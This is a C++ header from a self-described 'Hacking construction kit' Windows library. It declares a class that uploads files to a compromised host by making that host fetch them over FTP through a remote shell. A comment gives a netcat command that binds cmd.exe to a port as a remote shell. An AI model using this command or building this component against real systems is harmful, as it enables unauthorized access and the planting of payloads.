/*
 * Hacking construction kit -- A GPL Windows security library.
 * While this library can potentially be used for nefarious purposes, 
 * it was written for educational and recreational
 * purposes only and the author does not endorse illegal use.
 *
 * This library is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 *
 * You should have received a copy of the GNU General Public License
 * along with this library.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Author: thirdstormofcythraul@outlook.com
 */
#pragma once

#include <winsock2.h>

// Upload a file to a remote host using a remote shell
// Just start netcat on remote: nc -L -p xxx -e cmd.exe
// This class will use ftp commands on remote to download the file
class UploadFileFtp{

public:
	// originalFile: path to the file on local host
	// destinationFile: name on remote host
	UploadFileFtp(const char *originalFile, const char *destinationFile);

	// socket: a socket open on a remote shell
	// target: target ip
	bool upload(SOCKET socket, const char *target);	

private:
	bool sendfile(const char* target, int port, const char *fileName);
	bool exploit(SOCKET socket, const char *localIp, const char *internetIp, const char *target);
	bool ftpServer(const char *localIp, const char *target);

	const char *original;
	const char *destination;

};